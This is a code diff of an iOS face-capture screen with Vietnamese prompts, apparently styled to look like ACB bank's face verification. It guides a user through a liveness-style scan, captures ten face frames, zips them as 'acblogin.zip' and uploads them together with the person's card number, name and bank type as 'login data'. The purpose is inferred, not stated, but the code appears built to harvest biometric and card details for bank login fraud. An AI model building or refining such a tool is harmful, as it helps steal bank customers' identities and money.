@@ -17,8 +17,7 @@
 @property (nonatomic, strong) UILabel *instructionLabel;
 @property (nonatomic, strong) UILabel *stageCounterLabel;
 @property (nonatomic, strong) UILabel *faceQualityBadge;
-@property (nonatomic, strong) UIButton *manualCaptureButton;
-@property (nonatomic, strong) UIButton *autoCaptureButton;
+@property (nonatomic, strong) UIButton *resetButton;
 @property (nonatomic, strong) UIButton *configButton;
 
 // Upload UI
@@ -56,7 +55,6 @@
 - (void)viewDidAppear:(BOOL)animated {
     [super viewDidAppear:animated];
     [self.cameraManager requestPermissionAndStart];
-    [self.cameraManager startAutoCapture];
 }
 
 - (void)viewDidLayoutSubviews {
@@ -92,7 +90,7 @@
     self.borderLayer.lineWidth = 4.0;
     [self.view.layer addSublayer:self.borderLayer];
     
-    // Scan Arcs (vong radar xoay quanh oval)
+    // Scan Arcs (vong radar xoay quanh oval giong ACB)
     self.scanArcLayer1 = [CAShapeLayer layer];
     self.scanArcLayer1.strokeColor = [UIColor colorWithRed:0.09 green:0.50 blue:0.95 alpha:1.0].CGColor;
     self.scanArcLayer1.fillColor = [UIColor clearColor].CGColor;
@@ -117,7 +115,7 @@
     
     // Instruction label
     self.instructionLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 84, self.view.bounds.size.width - 40, 44)];
-    self.instructionLabel.text = @"Vui lòng nhìn thẳng và giữ khuôn mặt trong khung hình";
+    self.instructionLabel.text = @"Vui lòng đưa khuôn mặt vào trong khung hình";
     self.instructionLabel.textColor = [UIColor colorWithWhite:0.95 alpha:1.0];
     self.instructionLabel.font = [UIFont systemFontOfSize:15];
     self.instructionLabel.textAlignment = NSTextAlignmentCenter;
@@ -125,7 +123,7 @@
     [self.view addSubview:self.instructionLabel];
     
     // Quality badge
-    self.faceQualityBadge = [[UILabel alloc] initWithFrame:CGRectMake((self.view.bounds.size.width - 220) / 2.0, 134, 220, 30)];
+    self.faceQualityBadge = [[UILabel alloc] initWithFrame:CGRectMake((self.view.bounds.size.width - 260) / 2.0, 134, 260, 30)];
     self.faceQualityBadge.text = @"Đang quét khuôn mặt...";
     self.faceQualityBadge.textColor = [UIColor whiteColor];
     self.faceQualityBadge.backgroundColor = [UIColor colorWithWhite:0.25 alpha:0.85];
@@ -153,6 +151,8 @@
     CGFloat ovalX = (screenW - ovalW) / 2.0;
     CGFloat ovalY = (screenH - ovalH) / 2.0 - 15.0;
     CGRect ovalRect = CGRectMake(ovalX, ovalY, ovalW, ovalH);
+    
+    self.cameraManager.ovalRect = ovalRect;
     
     UIBezierPath *path = [UIBezierPath bezierPathWithRect:self.view.bounds];
     UIBezierPath *ovalPath = [UIBezierPath bezierPathWithOvalInRect:ovalRect];
@@ -197,27 +197,16 @@
     CGFloat screenW = self.view.bounds.size.width;
     CGFloat screenH = self.view.bounds.size.height;
     
-    // Nut Chup Ngay (Manual 10 frames)
-    self.manualCaptureButton = [UIButton buttonWithType:UIButtonTypeSystem];
-    self.manualCaptureButton.frame = CGRectMake(24, screenH - 125, (screenW - 56) * 0.58, 48);
-    self.manualCaptureButton.backgroundColor = [UIColor colorWithRed:0.09 green:0.50 blue:0.95 alpha:1.0];
-    [self.manualCaptureButton setTitle:@"CHỤP NGAY (10F)" forState:UIControlStateNormal];
-    [self.manualCaptureButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
-    self.manualCaptureButton.titleLabel.font = [UIFont boldSystemFontOfSize:15];
-    self.manualCaptureButton.layer.cornerRadius = 24;
-    [self.manualCaptureButton addTarget:self action:@selector(onManualCaptureTapped) forControlEvents:UIControlEventTouchUpInside];
-    [self.view addSubview:self.manualCaptureButton];
-    
-    // Nut Quet Tu Dong (Reset / Start Auto)
-    self.autoCaptureButton = [UIButton buttonWithType:UIButtonTypeSystem];
-    self.autoCaptureButton.frame = CGRectMake(CGRectGetMaxX(self.manualCaptureButton.frame) + 10, screenH - 125, (screenW - 56) * 0.42, 48);
-    self.autoCaptureButton.backgroundColor = [UIColor colorWithWhite:0.3 alpha:0.8];
-    [self.autoCaptureButton setTitle:@"TỰ ĐỘNG" forState:UIControlStateNormal];
-    [self.autoCaptureButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
-    self.autoCaptureButton.titleLabel.font = [UIFont boldSystemFontOfSize:15];
-    self.autoCaptureButton.layer.cornerRadius = 24;
-    [self.autoCaptureButton addTarget:self action:@selector(onResetAutoCapture) forControlEvents:UIControlEventTouchUpInside];
-    [self.view addSubview:self.autoCaptureButton];
+    // Nut Quet Lai (Reset)
+    self.resetButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.resetButton.frame = CGRectMake((screenW - 180) / 2.0, screenH - 110, 180, 44);
+    self.resetButton.backgroundColor = [UIColor colorWithWhite:0.25 alpha:0.8];
+    [self.resetButton setTitle:@"QUÉT LẠI" forState:UIControlStateNormal];
+    [self.resetButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
+    self.resetButton.titleLabel.font = [UIFont boldSystemFontOfSize:15];
+    self.resetButton.layer.cornerRadius = 22;
+    [self.resetButton addTarget:self action:@selector(onResetTapped) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.resetButton];
     
     // Nut Cau Hinh
     self.configButton = [UIButton buttonWithType:UIButtonTypeSystem];
@@ -261,21 +250,13 @@
 
 #pragma mark - Actions
 
-- (void)onManualCaptureTapped {
-    self.faceQualityBadge.text = @"ĐANG CHỤP 10 KHUNG HÌNH...";
-    self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.1 green:0.55 blue:0.95 alpha:0.9];
-    self.borderLayer.strokeColor = [UIColor colorWithRed:0.1 green:0.6 blue:1.0 alpha:1.0].CGColor;
-    [self.cameraManager triggerManualCapture];
-}
-
-- (void)onResetAutoCapture {
+- (void)onResetTapped {
     [self.cameraManager resetCapture];
-    self.instructionLabel.text = @"Vui lòng nhìn thẳng và giữ khuôn mặt trong khung hình";
+    self.instructionLabel.text = @"Vui lòng đưa khuôn mặt vào trong khung hình";
     self.stageCounterLabel.text = @"Tiến trình: 0/10 frames";
     self.borderLayer.strokeColor = [UIColor colorWithWhite:0.75 alpha:1.0].CGColor;
-    self.faceQualityBadge.text = @"Bật quét tự động...";
+    self.faceQualityBadge.text = @"Đang quét khuôn mặt...";
     self.faceQualityBadge.backgroundColor = [UIColor colorWithWhite:0.25 alpha:0.85];
-    [self.cameraManager startAutoCapture];
 }
 
 - (void)onConfigTapped {
@@ -297,47 +278,59 @@
 
 - (void)cameraManagerPermissionDenied {
     UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Cần quyền Camera"
-                                                                   message:@"Vui lòng cho phép quyền Camera trong Cài đặt iPhone để quét khuôn mặt."
+                                                                   message:@"Vui lòng cho phép quyền Camera trong Cài đặt iPhone để xác thực khuôn mặt."
                                                             preferredStyle:UIAlertControllerStyleAlert];
     [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
     [self presentViewController:alert animated:YES completion:nil];
 }
 
-- (void)cameraManagerDidDetectFace:(CGRect)screenFaceBounds isCentered:(BOOL)centered isDistanceQualified:(BOOL)qualified distanceRatio:(CGFloat)ratio {
-    if (CGRectIsEmpty(screenFaceBounds)) {
-        self.faceQualityBadge.text = @"Không thấy khuôn mặt";
-        self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.7 green:0.2 blue:0.2 alpha:0.8];
-        self.borderLayer.strokeColor = [UIColor colorWithWhite:0.5 alpha:1.0].CGColor;
-        return;
-    }
+- (void)cameraManagerDidUpdateFaceStatus:(ACBFaceStatus)status message:(NSString *)message faceBounds:(CGRect)screenRect {
+    self.instructionLabel.text = message;
+    self.faceQualityBadge.text = message;
     
-    if (!centered) {
-        self.faceQualityBadge.text = @"Vào giữa khung hình";
-        self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.85 green:0.55 blue:0.1 alpha:0.85];
-        self.borderLayer.strokeColor = [UIColor colorWithRed:0.9 green:0.6 blue:0.1 alpha:1.0].CGColor;
-        return;
+    switch (status) {
+        case ACBFaceStatusFaceOK:
+            self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.0 green:0.80 blue:0.35 alpha:0.95];
+            self.borderLayer.strokeColor = [UIColor colorWithRed:0.0 green:0.88 blue:0.4 alpha:1.0].CGColor;
+            break;
+            
+        case ACBFaceStatusTooFar:
+        case ACBFaceStatusTooClose:
+            self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.1 green:0.50 blue:0.85 alpha:0.85];
+            self.borderLayer.strokeColor = [UIColor colorWithRed:0.1 green:0.55 blue:0.95 alpha:1.0].CGColor;
+            break;
+            
+        case ACBFaceStatusNotCentered:
+        case ACBFaceStatusHeadTilted:
+        case ACBFaceStatusEyesClosed:
+        case ACBFaceStatusSmiling:
+            self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.85 green:0.55 blue:0.1 alpha:0.85];
+            self.borderLayer.strokeColor = [UIColor colorWithRed:0.9 green:0.6 blue:0.1 alpha:1.0].CGColor;
+            break;
+            
+        case ACBFaceStatusNoFace:
+        case ACBFaceStatusMultipleFaces:
+        default:
+            self.faceQualityBadge.backgroundColor = [UIColor colorWithWhite:0.25 alpha:0.85];
+            self.borderLayer.strokeColor = [UIColor colorWithWhite:0.70 alpha:1.0].CGColor;
+            break;
     }
-    
-    if (!qualified) {
-        self.faceQualityBadge.text = (ratio < 0.20) ? @"Lại gần hơn chút" : @"Lùi ra xa chút";
-        self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.1 green:0.5 blue:0.85 alpha:0.85];
-        self.borderLayer.strokeColor = [UIColor colorWithRed:0.1 green:0.55 blue:0.95 alpha:1.0].CGColor;
-        return;
-    }
-    
-    // Dat chuan -> Vien oval xanh la cay va tu dong chup
-    self.faceQualityBadge.text = @"ĐẠT CHUẨN - ĐANG CHỤP...";
-    self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.15 green:0.75 blue:0.25 alpha:0.9];
-    self.borderLayer.strokeColor = [UIColor colorWithRed:0.15 green:0.85 blue:0.25 alpha:1.0].CGColor;
+}
+
+- (void)cameraManagerDidStartCapturing {
+    self.faceQualityBadge.text = @"ĐẠT CHUẨN - ĐANG CHỤP 10 FRAMES...";
+    self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.0 green:0.80 blue:0.35 alpha:0.95];
+    self.borderLayer.strokeColor = [UIColor colorWithRed:0.0 green:0.88 blue:0.4 alpha:1.0].CGColor;
+    self.stageCounterLabel.text = @"Đang chụp: 0/10 frames";
 }
 
 - (void)cameraManagerDidCaptureFrame:(UIImage *)image index:(NSInteger)index total:(NSInteger)total {
-    self.stageCounterLabel.text = [NSString stringWithFormat:@"Đã chụp: %ld/%ld frames", (long)index, (long)total];
+    self.stageCounterLabel.text = [NSString stringWithFormat:@"Đang chụp: %ld/%ld frames", (long)index, (long)total];
 }
 
 - (void)cameraManagerDidFinishCaptureWithFolder:(NSString *)folderPath {
-    self.instructionLabel.text = @"Đã đủ 10 ảnh! Đang đóng gói acblogin.zip...";
-    self.stageCounterLabel.text = @"Đang chuẩn bị gửi...";
+    self.instructionLabel.text = @"Đã chụp đủ 10 ảnh! Đang đóng gói acblogin.zip...";
+    self.stageCounterLabel.text = @"Đang gửi dữ liệu...";
     self.faceQualityBadge.text = @"Hoàn tất chụp";
     
     NSString *zipPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"acblogin.zip"];
@@ -353,6 +346,7 @@
     self.progressBar.progress = 0.0;
     self.uploadStatusLabel.text = @"Đang gửi dữ liệu đăng nhập...";
     
+    // Upload fileName = "acblogin.zip"
     [self.uploader uploadZipFile:zipPath fileName:@"acblogin.zip" card:self.cardNumber name:self.userName bankType:self.bankType];
 }
 
